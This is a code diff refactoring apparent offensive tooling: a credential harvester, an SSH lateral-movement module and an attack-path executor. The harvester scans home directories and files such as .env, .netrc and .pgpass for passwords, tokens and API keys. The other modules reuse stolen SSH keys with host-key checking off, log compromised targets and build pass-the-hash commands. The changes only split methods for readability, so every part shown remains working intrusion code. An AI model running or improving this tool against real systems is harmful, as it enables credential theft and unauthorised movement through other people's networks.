@@ -236,65 +236,56 @@ class CredentialHarvester:
         
         return found
     
+    def _parse_config_file(self, filepath: str, password_regex) -> List[Credential]:
+        """Parse a single config file for credentials"""
+        found_in_file = []
+        try:
+            with open(filepath, 'r', errors='ignore') as f:
+                content = f.read(10000)  # First 10KB
+            
+            matches = password_regex.findall(content)
+            for match in matches:
+                if len(match) > 3 and match.lower() not in ['null', 'none', 'empty', 'changeme']:
+                    cred = Credential(
+                        username="config",
+                        domain="",
+                        credential_type=CredentialType.PASSWORD,
+                        value=match,
+                        source=filepath
+                    )
+                    found_in_file.append(cred)
+        except (PermissionError, IOError):
+            pass
+        return found_in_file
+
     def harvest_config_files(self, search_paths: List[str] = None) -> List[Credential]:
         """
-        Search config files for embedded credentials.
-        
-        Args:
-            search_paths: Paths to search (defaults to home directory)
-            
-        Returns:
-            List of found credentials
+        Search config files for embedded credentials (Refactored for complexity).
         """
         if search_paths is None:
             search_paths = [os.path.expanduser("~")]
-        
+            
         found = []
-        config_patterns = [
-            "*.conf", "*.cfg", "*.ini", "*.yaml", "*.yml",
-            ".env", ".netrc", ".pgpass", ".my.cnf"
-        ]
-        
+        config_patterns = ["*.conf", "*.cfg", "*.ini", "*.yaml", "*.yml", ".env", ".netrc", ".pgpass", ".my.cnf"]
         password_regex = re.compile(
             r'(?:password|passwd|pwd|secret|token|api_key|apikey)\s*[=:]\s*["\']?([^"\'\s\n]+)',
             re.IGNORECASE
         )
         
         for search_path in search_paths:
-            if not os.path.exists(search_path):
-                continue
+            if not os.path.exists(search_path): continue
             
             for root, dirs, files in os.walk(search_path):
-                # Skip hidden and system directories
                 dirs[:] = [d for d in dirs if not d.startswith('.')]
-                
                 for filename in files:
                     filepath = os.path.join(root, filename)
-                    
-                    # Check file extension
                     if not any(filepath.endswith(p.replace("*", "")) for p in config_patterns):
                         if not any(p.replace("*", "") in filename for p in config_patterns):
                             continue
                     
-                    try:
-                        with open(filepath, 'r', errors='ignore') as f:
-                            content = f.read(10000)  # First 10KB
-                        
-                        matches = password_regex.findall(content)
-                        for match in matches:
-                            if len(match) > 3 and match not in ['null', 'none', 'empty', 'changeme']:
-                                cred = Credential(
-                                    username="config",
-                                    domain="",
-                                    credential_type=CredentialType.PASSWORD,
-                                    value=match,
-                                    source=filepath
-                                )
-                                found.append(cred)
-                                self.harvested.append(cred)
-                                
-                    except (PermissionError, IOError):
-                        continue
+                    file_creds = self._parse_config_file(filepath, password_regex)
+                    found.extend(file_creds)
+                    self.harvested.extend(file_creds)
         
         return found
     
@@ -535,7 +526,7 @@ class ADAnalyzer:
         # Try to find domain controllers via DNS
         try:
             # Look for _ldap._tcp SRV records
-            dc_query = f"_ldap._tcp.{domain}"
+            # Look for _ldap._tcp SRV records (Query logic for future implementation)
             # This would use DNS query in real implementation
             # For now, try to resolve common DC names
             for prefix in ["dc", "dc1", "dc01", "pdc"]:
@@ -664,95 +655,56 @@ class LateralMover:
         self.successful_moves: List[Dict[str, Any]] = []
         self.failed_moves: List[Dict[str, Any]] = []
     
-    def move_ssh(
-        self,
-        target: str,
-        username: str,
-        credential: Credential,
-        command: str = None
-    ) -> Dict[str, Any]:
-        """
-        Move to target via SSH.
-        
-        Args:
-            target: Target host
-            username: SSH username
-            credential: Credential (password or SSH key)
-            command: Optional command to execute
-            
-        Returns:
-            Result dict with success status and output
-        """
-        result = {
-            "technique": MovementTechnique.SSH.value,
-            "target": target,
-            "username": username,
-            "success": False,
-            "output": "",
-            "error": ""
-        }
-        
+    def _prepare_ssh_key(self, key_content: str) -> str:
+        """Securely write SSH key to temp file"""
+        import tempfile
+        with tempfile.NamedTemporaryFile(mode='w', delete=False, suffix='.key') as f:
+            f.write(key_content)
+            key_file = f.name
+        os.chmod(key_file, 0o600)
+        return key_file
+
+    def _execute_ssh(self, cmd_list: List[str], timeout: int = 30) -> Tuple[bool, str, str]:
+        """Execute SSH command with subprocess"""
+        proc = None
         try:
-            # Build SSH command
-            ssh_opts = "-o StrictHostKeyChecking=no -o BatchMode=yes"
-            
-            if credential.credential_type == CredentialType.SSH_KEY:
-                # Write key to temp file
-                import tempfile
-                with tempfile.NamedTemporaryFile(mode='w', delete=False, suffix='.key') as f:
-                    f.write(credential.value)
-                    key_file = f.name
-                os.chmod(key_file, 0o600)
-                
-                # Secure command construction
-                cmd_list = ["ssh"]
-                if ssh_opts:
-                    cmd_list.extend(shlex.split(ssh_opts))
-                cmd_list.extend(["-i", key_file, f"{username}@{target}"])
-                
-                if command:
-                    cmd_list.append(command)
-                
-                # Execute (with timeout)
-                # Execute (with timeout)
-                proc = None
-                try:
-                    proc = subprocess.Popen(
-                        cmd_list, 
-                        stdout=subprocess.PIPE, 
-                        stderr=subprocess.PIPE,
-                        text=True
-                    )
-                    stdout, stderr = proc.communicate(timeout=30)
-                    
-                    result["success"] = proc.returncode == 0
-                    result["output"] = stdout
-                    if stderr:
-                        result["error"] = stderr
-                        
-                except subprocess.TimeoutExpired:
-                    if proc:
-                        proc.kill()
-                        proc.communicate()
-                    result["error"] = "Connection timeout"
-                finally:
-                    # Clean up key file
-                    try:
-                        os.unlink(key_file)
-                    except Exception:
-                        pass
-            
-            else:
-                # Would use sshpass or similar for password auth
-                result["error"] = "Password authentication requires sshpass"
-                
+            proc = subprocess.Popen(
+                cmd_list, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True
+            )
+            stdout, stderr = proc.communicate(timeout=timeout)
+            return proc.returncode == 0, stdout, stderr
+        except subprocess.TimeoutExpired:
+            if proc:
+                proc.kill()
+                proc.communicate()
+            return False, "", "Connection timeout"
         except Exception as e:
-            result["error"] = str(e)
+            return False, "", str(e)
+
+    def move_ssh(self, target: str, username: str, credential: Credential, command: str = None) -> Dict[str, Any]:
+        """
+        Move to target via SSH (Refactored for complexity).
+        """
+        result = {"technique": MovementTechnique.SSH.value, "target": target, "username": username, "success": False, "output": "", "error": ""}
         
-        if result["success"]:
-            self.successful_moves.append(result)
-        else:
-            self.failed_moves.append(result)
+        if credential.credential_type != CredentialType.SSH_KEY:
+            result["error"] = "Password authentication requires sshpass (Not implemented)"
+            return result
+
+        key_file = self._prepare_ssh_key(credential.value)
+        try:
+            ssh_opts = "-o StrictHostKeyChecking=no -o BatchMode=yes"
+            cmd_list = ["ssh"] + shlex.split(ssh_opts) + ["-i", key_file, f"{username}@{target}"]
+            if command: cmd_list.append(command)
+            
+            success, stdout, stderr = self._execute_ssh(cmd_list)
+            result.update({"success": success, "output": stdout, "error": stderr})
+        finally:
+            try: os.unlink(key_file)
+            except Exception: pass
+            
+        if result["success"]: self.successful_moves.append(result)
+        else: self.failed_moves.append(result)
         
         return result
     
@@ -815,8 +767,8 @@ class LateralMover:
         return {
             "successful": len(self.successful_moves),
             "failed": len(self.failed_moves),
-            "techniques_used": list(set(m["technique"] for m in self.successful_moves)),
-            "targets_compromised": list(set(m["target"] for m in self.successful_moves))
+            "techniques_used": list({m["technique"] for m in self.successful_moves}),
+            "targets_compromised": list({m["target"] for m in self.successful_moves})
         }
 
 
@@ -955,51 +907,44 @@ class HiveMind:
         
         return paths
     
+    def _find_matching_credential(self, technique: MovementTechnique) -> Optional[Credential]:
+        """Find a credential matching the movement technique"""
+        for c in self.harvester.harvested:
+            if technique == MovementTechnique.SSH and c.credential_type == CredentialType.SSH_KEY:
+                return c
+            if technique in [MovementTechnique.PSEXEC, MovementTechnique.PASS_THE_HASH] and c.credential_type == CredentialType.NTLM_HASH:
+                return c
+        return None
+
+    def _execute_hop(self, hop: str, technique: MovementTechnique, result: Dict[str, Any]) -> bool:
+        """Execute a single hop in the attack path"""
+        cred = self._find_matching_credential(technique)
+        if not cred:
+            result["output"] = f"No suitable credential for {technique.value}"
+            return False
+
+        if technique == MovementTechnique.SSH:
+            move_result = self.mover.move_ssh(hop, cred.username, cred, "whoami")
+            if move_result["success"]:
+                result["hops_completed"] += 1
+                result["final_position"] = hop
+                self.current_host = hop
+                return True
+        elif technique in [MovementTechnique.PSEXEC, MovementTechnique.PASS_THE_HASH]:
+            cmd = self.mover.generate_pth_command(hop, cred.username, cred.value)
+            result["output"] = f"Manual execution required: {cmd}"
+            return False
+        return False
+
     def execute_movement(self, path: AttackPath) -> Dict[str, Any]:
         """
-        Execute lateral movement along attack path.
-        
-        Args:
-            path: AttackPath to execute
-            
-        Returns:
-            Execution result
+        Execute lateral movement along attack path (Refactored for complexity).
         """
-        result = {
-            "path": path,
-            "success": False,
-            "hops_completed": 0,
-            "final_position": self.current_host,
-            "output": ""
-        }
+        result = {"path": path, "success": False, "hops_completed": 0, "final_position": self.current_host, "output": ""}
         
         for i, hop in enumerate(path.hops):
             technique = path.techniques[i] if i < len(path.techniques) else path.techniques[-1]
-            
-            # Find appropriate credential
-            cred = None
-            for c in self.harvester.harvested:
-                if technique == MovementTechnique.SSH and c.credential_type == CredentialType.SSH_KEY:
-                    cred = c
-                    break
-                elif technique in [MovementTechnique.PSEXEC, MovementTechnique.PASS_THE_HASH]:
-                    if c.credential_type == CredentialType.NTLM_HASH:
-                        cred = c
-                        break
-            
-            if cred and technique == MovementTechnique.SSH:
-                move_result = self.mover.move_ssh(hop, cred.username, cred, "whoami")
-                if move_result["success"]:
-                    result["hops_completed"] += 1
-                    result["final_position"] = hop
-                    self.current_host = hop
-                else:
-                    break
-            else:
-                # Generate command for manual execution
-                if cred and cred.credential_type == CredentialType.NTLM_HASH:
-                    cmd = self.mover.generate_pth_command(hop, cred.username, cred.value)
-                    result["output"] = f"Manual execution required: {cmd}"
+            if not self._execute_hop(hop, technique, result):
                 break
         
         result["success"] = result["hops_completed"] == len(path.hops)
